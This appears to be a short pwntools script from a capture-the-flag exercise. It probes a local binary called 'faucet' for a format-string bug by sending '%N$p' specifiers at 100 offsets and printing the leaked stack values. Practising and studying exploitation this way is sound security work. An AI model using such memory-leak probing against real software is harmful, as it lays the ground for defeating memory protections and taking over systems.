#!/usr/bin/env python
from pwn import *

# Defitions
e = context.binary = ELF('./faucet',checksec=False)
context.log_level = 'critical'

for i in range(100):
    io = process(e.path)
    io.sendlineafter('> ','5')
    io.sendlineafter(': ','%' + str(i) + '$p')
    io.recvuntil('You have bought a ')
    print(str(i) + ': ' + io.recvline())
    io.close()
